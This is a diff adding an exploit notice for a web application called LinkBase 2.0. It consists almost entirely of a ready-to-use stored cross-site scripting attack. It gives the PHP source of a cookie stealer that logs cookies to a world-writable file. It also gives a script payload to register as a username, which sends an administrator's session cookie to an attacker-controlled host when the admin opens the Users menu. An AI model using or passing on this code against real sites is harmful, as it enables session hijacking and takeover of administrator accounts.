@@ -1,0 +1,29 @@
+#################################################################################################################
+[+] Download LinkBase 2.0 Cookie Grabber Exploit
+[+] Discovered By SirGod
+[+] www.mortal-team.net
+[+] www.h4cky0u.org
+[+] Greetz : All my friends
+#################################################################################################################
+
+[+] Make 2 files and upload to your host :
+
+  stealer.php  - &gt; Put the following code into the file :
+ 
+&lt;?php
+$cookie = $_GET[&#039;cookie&#039;];
+$log = fopen(&quot;log.txt&quot;, &quot;a&quot;);
+fwrite($log, $cookie .&quot;\n&quot;);
+fclose($log);
+?&gt;
+
+  log.txt   - &gt; CHMOD it 777 and put in the same directory with stealer.php
+ 
+[+] Register as :
+
+  &lt;script&gt;document.location =&quot;http://[YOUR_HOST]/[path]/stealer.php?cookie=&quot; + document.cookie;&lt;/script&gt;
+
+  Every time the admin will visit the &quot;Users&quot; menu from admin panel he will be redirected to your cookie stealer.
+
+#################################################################################################################
+
